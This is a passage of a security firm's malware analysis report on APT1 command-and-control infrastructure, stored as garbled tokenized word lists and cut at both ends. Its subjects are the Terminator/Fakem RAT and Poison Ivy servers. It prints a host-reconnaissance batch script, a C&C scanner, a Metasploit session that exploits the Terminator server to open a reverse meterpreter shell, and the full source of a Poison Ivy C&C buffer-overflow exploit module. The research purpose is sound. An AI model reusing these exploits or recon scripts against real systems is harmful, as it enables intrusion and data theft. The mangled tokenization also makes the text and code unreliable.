"dump", "64", "bits", "(", "binary", ")"], ["RAT", ",", "we", "keep", "the", "name", "private", "because", "it"], ["Private", "a78cbc7d652955be49498ee9834e6a2d", "contains", "the", "name", "of", "the", "target"], ["RAT", ",", "we", "keep", "the", "name", "private", "because", "it"], ["Private", "40a3e68eafd50c02b076acf71d1569db", "contains", "the", "name", "of", "the", "target"], ["RAT", ",", "we", "keep", "the", "name", "private", "because", "it"], ["Private", "5682aa66f0d1566cf3b7e27946943b4f", "contains", "the", "name", "of", "the", "target"], ["RAT", ",", "we", "keep", "the", "name", "private", "because", "it"], ["Private", "c16269c4a32062863b63a123951166d2", "contains", "the", "name", "of", "the", "target", "Terminator3.6", "."], ["Homemade", "RAT", "server", "called", "Terminator"], ["669cef1b64aa530292cc823981c506f6", "exe", "(", "aka", "Fakem", "RAT", ")"], ["Malware", "sample", "of", "the", "RAT", "Terminator", "Shtrace.exe", "380fe92c23f2028459f54cb289c3553f"], ["(", "aka", "Fakem", "RAT", ")"], ["EXP.EXE"], ["e258cf52ef4659ed816f3d084b3ec6c7"], ["The", "binary", "contains", "Oracle", "DB", "queries", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "15", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "pr.exe", "Binary", "to", "collect", "information", "as", "group", ",", "server", "and", "OS", "via", "SMB", "a4ad1d1a512a7e00d2d4c843ef559a7a", "gsecdump", "v0.7", "by", "Johannes", "Gumbel", "http://technet.microsoft.com/en53b77ada5498ef207d48a76243051a01", "us", "/", "library", "/", "cc731935%28v", "=", "ws.10%29.aspx", "98a65022855013588603b8bed1256d5e"], ["Dotpot", "Port", "Scanner", "Ver", "0.92", "wget.exe", "57a9d084b7d016f776bfc78a2e76d03d", "Official", "wget", "binary", "xForceDel.ex", "9fbea622b9a1361637e0b97d7dd34560"], ["Tool", "to", "delete", "lock", "file", "getos.exe", "dump.exe", "nltest.exe", "71d3f12a947b4da2b7da3bee4193a110", "The", "RAT", "called", "Terminator", "will", "be", "described", "in", "the", "next", "chapter", "."], ["We", "found", "a", "batch", "script", "similar", "to", "the", "one", "described", "in", "Mandiant", "\u2019s", "report", ":", "@echo", "off", "echo", "%", "computername%", ">", ">", "c:\\recycler\\%computername%_base.dat", "qwinsta", ">", ">", "c:\\recycler\\%computername%_base.dat", "date", "/t", ">", ">", "c:\\recycler\\%computername%_base.dat", "time", "/t", ">", ">", "c:\\recycler\\%computername%_base.dat", "ipconfig", "/all", ">", ">", "c:\\recycler\\%computername%_base.dat", "nbtstat", "-n", ">", ">", "c:\\recycler\\%computername%_base.dat", "systeminfo", ">", ">", "c:\\recycler\\%computername%_base.dat", "set", ">", ">", "c:\\recycler\\%computername%_base.dat", "net", "share", ">", ">", "c:\\recycler\\%computername%_base.dat", "net", "start", ">", ">", "c:\\recycler\\%computername%_base.dat", "tasklist", "/v", ">", ">", "c:\\recycler\\%computername%_base.dat", "netstat", "-ano", ">", ">", "c:\\recycler\\%computername%_base.dat", "dir", "c:\\", "/a", ">", ">", "c:\\recycler\\%computername%_base.dat", "dir", "d:\\", "/a", ">", ">", "c:\\recycler\\%computername%_base.dat", "dir", "c:\\progra~1", ">", ">", "c:\\recycler\\%computername%_base.dat", "dir", "c:\\docume~1", ">", ">", "c:\\recycler\\%computername%_base.dat", "net", "view", "/domain", ">", ">", "c:\\recycler\\%computername%_base.dat", "dir", "/a", "/s", "c:\\", ">", ">"], ["c:\\recycler\\%computername%_filelist.dat", "dir", "/a", "/s"], ["d:\\", ">", ">", "c:\\recycler\\%computername%_filelist.dat", "del", "c:\\recycler\\base.bat"], ["The", "purpose", "of", "this", "batch", "script", "is", "to", "get", "information", "about", "an", "infected", "workstation", "."], ["In", "addition", ",", "we", "found", "a", "directory", "with", "the", "official", "SecureCrt", ",", "which", "is", "an", "SSH", "client", "."], ["We", "also", "found", "the", "SysInternals", "suite", "from", "Microsoft", "."], ["4.3", "Targets"], ["The", "attackers", "seem", "to", "use", "a", "dedicated", "proxy", "and", "Poison", "Ivy", "server", "combination", "for", "each", "target", "."], ["When", "a", "target", "discovers", "the", "IP", "address", "of", "a", "proxy", ",", "this", "address", "is", "reassigned", "to", "another", "target", "."], ["That", "\u2019s", "why", "it", "is", "primordial", "to", "share", "the", "C&C", "servers", "IPs", "with", "our", "partners", "."], ["The", "targets", "were", "private", "and", "public", "companies", ",", "political", "institutions", ",", "activists", ",", "associations", "or", "reporters", "."], ["On", "the", "Poison", "Ivy", "server", ",", "a", "directory", "is", "created", "for", "every", "target", "."], ["Within", "this", "directory", ",", "a", "directory", "for", "each", "infected", "machine", "was", "created", "."], ["The", "naming", "convention", "for", "those", "directories", "is"], ["HOSTNAME^USERNAME", "."], ["Here", "is", "an", "example", ":"], ["E:\\companyABCD\\alien^rootbsd\\"], ["In", "those", "directories", "files", "are", "not", "sorted", "in", "any", "specific", "manner", "."], ["The", "documents", "types", "are", ":", "-", ".PPT"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "16", "of", "48", "Type", "Project"], ["Title", "Classification", "-", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", ".XLS"], [".DOC"], [".PDF"], [".JPG"], ["Among", "those", "documents", ",", "we", "found", ":", "-", "Network", "diagrams", ";", "Internal", "IP", "/", "user", "/", "password", "combination", "(", "local", "administrator", ",", "domain", "administrator", ",", "root", ",", "web", ",", "webcam", "\u2026", ")", ";", "Map", "of", "the", "building", "with", "digital", "code", "to", "open", "doors", ";", "Security", "incident", "listings", ";", "Security", "policies", ";", "\u2026"], ["The", "sensitive", "documents", "were", "password", "protected", "."], ["The", "passwords", "pattern", "is", "[", "a", "-", "z]{3,4}[0", "-", "9]{3,4", "}", ","], ["so", "it", "was", "easy", "to", "brute", "force", "them", "in", "reasonable", "time", "."], ["Here", "is", "an", "example", "of", "a", "network", "diagram", "."], ["Figure", "6", ":"], ["Example", "of", "network", "target", "diagram", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "17", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "5", "Terminator", "RAT"], ["(", "aka", "Fakem", "RAT", ")", "5.1", "Description"], ["On", "one", "of", "the", "proxy", "server", ",", "we", "identified", "a", "binary", "called", "Terminator3.6.exe", "."], ["After", "a", "quick", "analysis", "we", "noticed", "that", "this", "binary", "is", "the", "server", "side", "of", "a", "homemade", "Remote", "Administration", "Tool", "(", "RAT", ")", "."], ["After", "analysis", ",", "we", "identified", "that", "this", "sample", "corresponds", "to", "Fakem", "RAT", "discovered", "by", "Trendmicro", "in", "January", "2013", "."], ["Additional", "information", "can", "be", "found", "there", ":", "http://www.trendmicro.com/cloudcontent/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf", "."], ["We", "were", "lucky", "enough", "to", "find", "the", "client", "side", "(", "the", "malware", ")", "on", "the", "same", "server", "."], ["These", "two", "binaries", "allowed", "us", "to", "test", "the", "product", "and", "see", "how", "it", "works", "."], ["5.2", "Password", "protection"], ["When", "the", "server", "is", "starting", ",", "a", "password", "is", "asked", ":", "Figure", "7", ":", "Terminator", "password"], ["We", "decided", "to", "crack", "this", "password", "."], ["A", "CRC", "is", "generated", "based", "on", "the", "supplied", "password", "."], ["Here", "is", "the", "algorithm", "of", "this", "CRC", ":", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "18", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Figure", "8", ":", "Terminator", "CRC", "algorithm"], ["After", "this", "operation", ",", "a", "xor", ",", "then", "a", "compare", "operation", "is", "done", ":", "Figure", "9", ":", "Terminator", "xor", "and", "compare", "operation", "on", "the", "password", "To", "obtain", "the", "password", ",", "we", "developed", "a", "brute", "forcer", ";", "the", "code", "source", "is", "available", "in", "the", "appendix", "."], ["The", "first", "argument", "is", "the", "maximum", "number", "or", "characters", "and", "the", "second", "is", "the", "value", "used", "in", "the", "comparison", "(", "available", "in", "the", "ASM", "code", ")", "."], ["rootbsd@alien:~/terminator$", "./bf"], ["10", "0xdafd58f3", "DEBUG", ":", "Ap@hX", "dafd58f3", "dafd58f3"], ["In", "this", "case", "the", "password", "to", "start", "the", "server", "is", "\u201c", "Ap@hX", "\u201d", "."], ["5.3", "Features", "and", "usage"], ["The", "malware", "\u2019s", "way", "to", "operate", "is", "simple", "and", "efficient", "since", "it", "does", "not", "embed", "any", "specific", "feature", "."], ["The", "malware", "waits", "for", "a", "library", "(", "DLL", ")", "sent", "from", "the", "command", "and", "control", "."], ["The", "attackers", "then", "choose", "a", "specific", "feature", ",", "and", "send", "the", "associated", "DLL", "file", "to", "the", "infected", "machine", "."], ["The", "libraries", "are", "stored", "in", "the", "server", "\u2019s", "executable", "file", "as", "resources", "."], ["The", "resources", "are", "not", "encrypted", "but", "the", "libraries", "headers", "are", "removed", "."], ["The", "communication", "scheme", "is", "really", "weird", ",", "the", "infected", "machine", "(", "the", "client", ")", "sent", "HTML", "to", "the"], ["C&C."], ["The", "communication", "starts", "with", ":", "<", "html><title>12356</title><body", ">"], ["This", "string", "can", "be", "identified", "in", "the", "memory", "of", "the", "process", "."], ["The", "pattern", "of", "the", "connection", "is", ":", "stage", "=", "\"", "<", "html><title>12356</title><body", ">", "\"", "stage", "+", "=", "\"", "\\xa0\\xf4\\xf6\\xf6", "\"", "stage", "+", "=", "\"", "\\xf6", "\"", "*", "(", "0x400", "-", "len(stage", ")", ")"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "19", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public"], ["Here", "is", "the", "main", "RAT", "\u2019s", "GUI", ":", "Figure", "10", ":", "Terminator", ":", "starting", "interface"], ["We", "can", "choose", "between", "three", "different", "protocols", ":", "Figure", "11", ":", "Terminator", ":"], ["Protocol", "and", "port", "choice", "When", "a", "machine", "is", "infected", ",", "it", "appears", "on", "the", "GUI", ":", "Figure", "12", ":", "Terminator", ":", "List", "of", "infected", "machines"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "20", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Below", "is", "the", "interface", "that", "is", "shown", "once", "a", "machine", "has", "been", "selected", ":", "Figure", "13", ":", "Terminator", ":"], ["List", "of", "features"], ["On", "the", "screenshot", "we", "can", "see", "the", "10", "available", "features", "."], ["Each", "one", "of", "the", "features", "matches", "a", "DLL", "file", "."], ["To", "upload", "a", "DLL", "to", "the", "infected", "machine", "(", "and", "enable", "its", "feature", ")", ",", "we", "have", "to", "tick", "the", "feature", "\u2019s", "checkbox", "and", "then", "click", "on", "\u201c", "Upload", "Plug", "\u201d", "."], ["For", "example", ",", "if", "we", "choose", "\u201c", "Shell", "Plug", "-", "ins", "\u201d", ",", "the", "button", "\u201c", "Shell", "\u201d", "(", "on", "the", "left", "pane", ")", "becomes", "enabled", "."], ["Here", "is", "the", "list", "of", "available", "features", ":", "-", "File", "management", ";", "Process", "management", ";", "Shell", "access", ";"], ["Screenshot", ";", "Registry", "management", ";", "Services", "management", ";", "Get", "information", "of", "the", "infected", "machine", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "21", "of", "48", "Type", "Project"], ["Title", "Classification", "-", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Keylogger", ";"], ["Dump", "password", "hashes", "in", "memory", ";", "View", "user", "\u2019s", "files", "."], ["Here", "are", "some", "screenshots", "of", "the", "administration", "interface", ":", "Figure", "14", ":", "Terminator", ":", "List", "of", "processes", "on", "the", "infected", "machine", "Figure", "15", ":", "Terminator", ":", "List", "of", "opened", "ports", "on", "the", "infected", "machine", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "22", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Figure", "16", ":", "Terminator", ":"], ["Remote", "shell", "on", "the", "infected", "machine", "Figure", "17", ":", "Terminator", ":"], ["Registry", "access", "to", "the", "infected", "machine", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "23", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Figure", "18", ":", "Terminator", ":", "Services", "management", "on", "the", "infected", "machine", "Figure", "19", ":", "Terminator", ":", "Information", "about", "the", "infected", "machine"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "24", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Figure", "20", ":", "Terminator", ":", "Installed", "software", "on", "the", "infected", "machine", "5.4", "Scanner"], ["We", "decided", "to", "create", "a", "scanner", "to", "identify", "the", "servers", "which", "were", "running", "Terminator", "."], ["Here", "is", "the", "code", "to", "identify", "the", "service", ":", "def", "check_terminator(self", ",", "host", ",", "port", ",", "res", "):", "try", ":", "af", ",", "socktype", ",", "proto", ",", "canonname", ",", "sa", "=", "res", "s", "=", "socket.socket(af", ",", "socktype", ",", "proto", ")", "s.settimeout(6", ")"], ["s.connect(sa", ")", "stage", "=", "\"", "<", "html><title>12356</title><body", ">", "\"", "stage", "+", "=", "\"", "\\xa0\\xf4\\xf6\\xf6", "\"", "stage", "+", "=", "\"", "\\xf6", "\"", "*", "(", "0x400", "-", "len(stage", ")", ")"], ["s.sendall(stage", ")", "data", "=", "s.recv(0x400", ")"], ["if", "len(data", ")", "<", "0x400", ":", "return", "if", "data.find(\"<html><title>12356</title><body", ">", "\"", ")", "=", "=", "-1", ":", "return", "print", "\"", "%", "s", "Terminator", "%", "s", "%", "s:%d", "\"", "%", "(", "datetime.datetime.now", "(", ")", ",", "host", ",", "sa[0", "]", ",", "sa[1", "]", ")"], ["With", "this", "script", ",", "we", "identified", "more", "C&C", "servers", "managed", "by", "the", "attackers", ",", "which", "allowed", "us", "to", "refine", "our", "scheme", "of", "the", "attacker", "\u2019s", "infrastructure", "."], ["5.5", "Remote", "code", "execution", "vulnerability"], ["After", "a", "full", "analysis", "of", "the", "communication", "protocol", ",", "we", "identified", "a", "vulnerability", "in", "the", "Command", "&", "Control", "executable", ":", "The", "server", "does", "not", "correctly", "parse", "the", "data", "sent", "by", "the", "infected", "machine", "."], ["We", "created", "an", "exploit", "to", "remotely", "take", "control", "of", "the", "command", "&", "control", "."], ["The", "code", "source", "of", "the", "Metasploit", "exploit", "is", "available", "in", "the", "appendix", "."], ["The", "exploitation", "provided", "the", "following", "result", "."], ["msf", ">", "use", "exploit", "/", "windows", "/", "misc", "/", "terminator_judgment_day", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "25", "of", "48", "Type", "Project"], ["Title", "Classification", "msf", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "exploit(terminator_judgment_day", ")", ">", "show", "options", "Module", "options", "(", "exploit", "/", "windows", "/", "misc", "/", "terminator_judgment_day", "):"], ["Name", "---RHOST", "RPORT", "Current", "Setting", "--------------80"], ["Required", "-------yes"], ["yes", "Description"], ["----------The", "target", "address"], ["The", "target", "port", "Exploit", "target", ":", "I", "d", "-0", "Name", "---Terminator", "3.7", "/", "Windows", "XP", "SP3", "msf", "exploit(terminator_judgment_day", ")", ">", "set", "rhost", "192.168.0.45", "rhost", "=", ">", "192.168.0.45", "msf", "exploit(terminator_judgment_day", ")", ">", "set", "payload", "meterpreter", "/", "revers", "[", "\u2026", "]", "payload", "=", ">", "windows", "/", "meterpreter", "/", "reverse_https", "msf", "exploit(terminator_judgment_day", ")", ">", "set", "lhost", "192.168.0.24", "lhost", "=", ">", "192.168.0.24", "msf", "exploit(terminator_judgment_day", ")", ">", "exploit"], ["[", "*", "]", "Started", "HTTPS", "reverse", "handler", "on", "https://192.168.0.24:8443/"], ["[", "*", "]", "Connection", "..."], ["[", "*", "]", "1024", "-", "653", "[", "*", "]", "Send", "exploit", "..."], ["[", "*", "]", "192.168.0.45:1050", "Request", "received", "for", "/q1fT", "..."], ["[", "*", "]", "192.168.0.45:1050", "Staging", "connection", "for", "target", "/q1fT", "received", "..."], ["[", "*", "]", "Patched", "user", "-", "agent", "at", "offset", "641512", "..."], ["[", "*", "]", "Patched", "transport", "at", "offset", "641172", "..."], ["[", "*", "]", "Patched", "URL", "at", "offset", "641240", "..."], ["[", "*", "]", "Patched", "Expiration", "Timeout", "at", "offset", "641772", "..."], ["[", "*", "]", "Patched", "Communication", "Timeout", "at", "offset", "641776", "..."], ["[", "*", "]", "Meterpreter", "session", "1", "opened", "(", "192.168.0.24:8443", "-", ">", "192.168.0.45:1050", ")", "at", "2013", "-", "03", "-", "13", "10:04:38", "+0100", "meterpreter", ">", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "26", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "6", "Conclusion"], ["In", "this", "report", ",", "we", "document", "how", "we", "could", "reveal", "the", "methodology", "and", "tools", "used", "by", "an", "attacker", "."], ["The", "used", "technologies", "were", "commonly", "known", ",", "which", "supports", "our", "fears", "that", "such", "kind", "of", "APT", "affects", "more", "and", "more", "infrastructures", "."], ["Among", "them", "we", "can", "find", "public", "companies", ",", "governmental", "and", "political", "institutions", "\u2026"], ["The", "most", "efficient", "and", "proactive", "way", "to", "protect", "an", "infrastructure", "and", "fight", "back", "the", "attackers", "is", "to", "understand", "their", "attacks", "and", "the", "way", "they", "work", "."], ["An", "interesting", "fact", "is", "to", "see", "the", "professionalization", "in", "this", "field", "."], ["Here", "are", "some", "key", "facts", "about", "the", "attackers", ":", "-", "More", "than", "300", "servers"], ["Use", "of", "proxy", "servers", "to", "hide", "their", "activities", ";", "one", "server", "per", "target", ";", "custom", "made", "malware", "working", "hours", ",", "such", "as", "office", "employees", "really", "good", "organization", "\u2026", "Infrastructures", "such", "as", "the", "one", "detailed", "in", "this", "report", "are", "expensive", "but", "Intelligence", "is", "a", "real", "issue", "."], ["People", "or", "organisations", "seem", "do", "not", "hesitate", "to", "pay", "for", "such", "illegal", "information", "theft", "."], ["\u201c", "The", "only", "real", "defense", "is", "offensive", "defense", "\u201d", "(", "Mao", "Zedong", ")"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "27", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Appendix", "Poison", "Ivy", "exploit", "#", "#"], ["#"], ["This", "file", "is", "part", "of", "the", "Metasploit", "Framework", "and", "may", "be", "subject", "to", "#", "redistribution", "and", "commercial", "restrictions", "."], ["Please", "see", "the", "Metasploit", "#", "web", "site", "for", "more", "information", "on", "licensing", "and", "terms", "of", "use", "."], ["#", "http://metasploit.com/"], ["#", "#", "require", "'", "msf", "/", "core", "'", "require", "'", "camellia", "'", "class", "Metasploit3", "<", "Msf::Exploit::Remote"], ["Rank", "=", "NormalRanking", "include", "Msf::Exploit::Remote::Tcp", "include", "Msf::Exploit::Brute", "def", "initialize(info", "=", "{", "}", ")"], ["super(update_info(info", ",", "'", "Name", "'", "="], [">", "\"", "Poison", "Ivy", "2.3.2", "C&C", "Server", "Buffer", "Overflow", "\"", ",", "'", "Description", "'", "=", ">", "%", "q", "{", "blabla", "}", ",", "'", "License", "'", "=", ">", "MSF_LICENSE", ",", "'", "Author", "'", "=", ">"], ["[", "'", "Hugo", "Caron", "'", ",", "#", "Malware.lu", "]", ",", "'", "DisclosureDate", "'", "=", ">", "\"", "Apr", "2013", "\"", ",", "'", "DefaultOptions", "'", "=", ">", "{", "'", "EXITFUNC", "'", "=", ">", "'", "thread", "'", ",", "}", ",", "'", "Payload", "'", "=", ">", "{", "'", "StackAdjustment", "'", "=", ">", "-4000", ",", "'", "Space", "'", "=", ">", "10000", ",", "'", "BadChars", "'", "=", ">", "\"", "\"", ",", "}", ",", "'", "Platform", "'", "=", ">", "'", "win", "'", ",", "'", "Targets", "'", "="], [">"], ["[", "[", "'", "Poison", "Ivy", "2.3.2", "'", ",", "{", "'", "Ret", "'", "="], [">", "0x0041AA97", ",", "'", "RWAddress", "'", "=", ">", "0x00401000", ",", "'", "Offset", "'", "=", ">", "0x806D", ",", "'", "PayloadOffset", "'", "=", ">", "0x75", ",", "'", "jmpPayload'=", ">", "\"", "\\x81\\xec\\x00\\x80\\x00\\x00\\xff\\xe4", "\"", "}", "]", ",", "[", "'", "Poison", "Ivy", "2.3.2", "-", "Bruteforce", "'", ",", "{", "'", "Ret", "'", "=", ">", "0x0041AA97", ",", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "28", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "'", "RWAddress", "'", "=", ">", "0x00401000", ",", "'", "Offset", "'", "=", ">", "0x806D", ",", "'", "PayloadOffset", "'", "=", ">", "0x75", ",", "'", "jmpPayload", "'", "=", ">", "\"", "\\x81\\xec\\x00\\x80\\x00\\x00\\xff\\xe4", "\"", ",", "'", "Bruteforce", "'", "=", ">", "{", "'", "Start", "'", "=", ">", "{", "'", "Try", "'", "=", ">", "1", "}", ",", "'", "Stop", "'", "=", ">", "{", "'", "Try", "'", "=", ">", "100", "}", ",", "'", "Step", "'", "=", ">", "1", ",", "'", "Delay", "'", "=", ">", "0", "}", "}", "]", "]", ",", "'", "DefaultTarget", "'", "=", ">", "0", ")", ")"], ["register_options", "(", "[", "Opt::RPORT(3460", ")", ",", "OptBool.new('RANDHEADER", "'", ",", "[", "true", ",", "'", "Send", "random", "bytes", "as", "the", "header", "'", ",", "false", "]", ")", ",", "OptString.new('Password", "'", ",", "[", "true", ",", "\"", "Client", "password", "\"", ",", "\"", "admin", "\"", "]", ")", ",", "]", ",", "self.class", ")"], ["register_advanced_options", "("], ["[", "OptInt.new('BruteWait", "'", ",", "[", "false", ",", "\"", "Delay", "between", "brute", "force", "attempts", "\"", ",", "2", "]", ")", "]", ",", "self.class", ")", "end", "def", "pad(data", ",", "pad_len", ")"], ["data_len", "=", "data.length", "return", "data", "+", "\"", "\\x00\"*(pad_len", "-", "data_len", ")", "end", "def", "check", "c", "=", "Camellia.new(pad(datastore['Password", "'", "]", ",", "32", ")", ")"], ["sig", "=", "c.encrypt(\"\\x00\"*16", ")"], ["lensig", "="], ["[", "0x000015D0].pack(\"V", "\"", ")"], ["connect", "sock.put(\"\\x00", "\"", "*", "256", ")", "response", "=", "sock.read(256", ")", "datalen", "=", "sock.read(4", ")", "disconnect", "if", "datalen", "=", "="], ["lensig", "if", "response[0", ",", "16", "]", "=", "=", "sig", "print_status(\"Password", ":", "\\\"#{datastore['Password']}\\", "\"", "\"", ")", "else", "print_status(\"Unknown", "password", ".", "\"", ")"], ["end", "return", "Exploit::CheckCode::Vulnerable", "end", "return", "Exploit::CheckCode::Safe", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "29", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "end", "def", "single_exploit", "if", "datastore['RANDHEADER", "'", "]"], ["=", "=", "true", "header", "=", "rand_text(0x20", ")", "else", "c", "=", "Camellia.new(pad(datastore['Password", "'", "]", ",", "32", ")", ")"], ["header", "="], ["c.encrypt(\"\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00", "\\x00\\x00\\x01\\x00\\xbb\\x00\\x00\\x00", "\"", ")", "header", "+", "=", "c.encrypt(\"\\xc2\\x00\\x00\\x00\\xc2\\x00\\x00\\x00", "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00", "\"", ")", "end", "do_exploit(header", ")", "end", "def", "brute_exploit(brute_target", ")"], ["if", "brute_target['Try", "'", "]", "=", "=", "1", "print_status(\"Bruteforcing", "-", "Try", "#", "{", "brute_target['Try", "'", "]", "}", ":"], ["Header", "for", "'", "admin", "'", "password", "\"", ")", "header", "=", "\"", "\\xe7\\x77\\x44\\x30\\x9a\\xe8\\x4b\\x79\\xa6\\x3f", "\\x11\\xcd\\x58\\xab\\x0c\\xdf\\x2a\\xcc\\xea\\x77", "\\x6f\\x8c\\x27\\x50\\xda\\x30\\x76\\x00\\x5d\\x15", "\\xde\\xb7", "\"", "else", "print_status(\"Bruteforcing", "\"", ")", "header", "=", "rand_text(0x20", ")", "end", "do_exploit(header", ")", "end", "def", "do_exploit(header", ")"], ["#", "Handshake", "connect", "print_status(\"Performing", "handshake", "...", "\"", ")", "sock.put(\"\\x00", "\"", "*", "256", ")"], ["sock.get", "#", "Do", "n't", "change", "the", "nulls", ",", "or", "it", "might", "not", "work", "xploit", "=", "''", "xploit", "<", "<", "header", "xploit", "<", "<", "\"", "\\x00", "\"", "*", "(", "target['PayloadOffset", "'", "]", "-", "xploit.length", ")", "xploit", "<", "<", "payload.encoded", "xploit", "<", "<", "\"", "\\x00", "\"", "*", "(", "target['Offset", "'", "]", "-", "xploit.length", ")", "xploit", "<", "<", "[", "target.ret].pack(\"V", "\"", ")", "xploit", "<", "<", "[", "target['RWAddress']].pack(\"V", "\"", ")", "xploit", "<", "<", "target['jmpPayload", "'", "]"], ["#"], ["The", "disconnection", "triggers", "the", "exploit", "print_status(\"Sending", "exploit", "...", "\"", ")", "sock.put(xploit", ")"], ["select(nil", ",", "nil", ",", "nil,5", ")", "disconnect", "end", "end", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "30", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Camellia", "plugin", "for", "John", "the", "Ripper", "/"], ["*", "Standard", "includes", "*", "/"], ["#", "include", "<", "string.h", ">", "#", "include", "<", "assert.h", ">", "#", "include", "<", "errno.h", ">", "/"], ["*", "John", "includes", "*", "/"], ["#", "include", "\"", "arch.h", "\"", "#", "include", "\"", "misc.h", "\"", "#", "include", "\"", "common.h", "\"", "#", "include", "\"", "formats.h", "\"", "#", "include", "\"", "params.h", "\"", "#", "include", "\"", "options.h", "\"", "#", "include", "\"", "base64.h", "\"", "/"], ["*", "If", "openmp", "*", "/"], ["#", "ifdef", "_", "OPENMP", "#", "include", "<", "omp.h", ">"], ["#", "define", "OMP_SCALE", "32", "#", "endif", "/", "*", "crypto", "includes", "*", "/"], ["#", "include", "<", "openssl", "/", "camellia.h", ">"], ["#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "FORMAT_LABEL", "FORMAT_NAME", "ALGORITHM_NAME", "BENCHMARK_COMMENT", "BENCHMARK_LENGTH", "PLAINTEXT_LENGTH", "BINARY_SIZE", "SALT_SIZE", "MIN_KEYS_PER_CRYPT", "MAX_KEYS_PER_CRYPT", "\"", "camellia", "\"", "\"", "Camellia", "bruteforce", "\"", "\"", "32/", "\"", "ARCH_BITS_STR", "\"", "\"", "-1", "32", "16", "0", "1", "1", "static", "struct", "fmt_tests", "cam_tests", "[", "]", "=", "{", "{", "\"", "$", "camellia$NeEGbM0Vhz7u+FGJZrcPiw==", "\"", ",", "\"", "admin", "\"", "}", ",", "{", "NULL", "}", "}", ";", "static", "char", "(", "*", "saved_key)[PLAINTEXT_LENGTH", "+", "1", "]", ";", "static", "char", "(", "*", "crypt_out)[BINARY_SIZE", "]", ";", "static", "void", "init(struct", "fmt_main", "*", "self", ")", "{", "#", "if", "defined", "(", "_", "OPENMP", ")", "int", "omp_t", ";", "omp_t", "=", "omp_get_max_threads", "(", ")", ";", "self->params.min_keys_per_crypt", "*", "=", "omp_t", ";", "omp_t", "*", "=", "OMP_SCALE", ";", "self->params.max_keys_per_crypt", "*", "=", "omp_t", ";", "#", "endif", "saved_key", "=", "mem_calloc_tiny(sizeof(*saved_key", ")"], ["*", "self->params.max_keys_per_crypt", ",", "MEM_ALIGN_NONE", ")", ";", "crypt_out", "=", "mem_calloc_tiny(sizeof(*crypt_out", ")"], ["*", "self->params.max_keys_per_crypt", ",", "MEM_ALIGN_NONE", ")", ";", "}", "static", "int", "valid(char", "*", "ciphertext", ",", "struct", "fmt_main", "*", "self", ")", "{", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "31", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "return", "!"], ["strncmp(ciphertext", ",", "\"", "$", "camellia$", "\"", ",", "10", ")", ";", "//magic", "secret", "number", "}", "static", "void", "*", "get_binary(char", "*", "ciphertext", ")", "{", "static", "union", "{", "unsigned", "char", "c[BINARY_SIZE+1", "]", ";", "ARCH_WORD", "dummy", ";", "}", "buf", ";", "unsigned", "char", "*", "out", "=", "buf.c", ";", "char", "*", "p", ";", "p", "=", "strrchr(ciphertext", ",", "'", "$", "'", ")", "+", "1", ";", "base64_decode(p", ",", 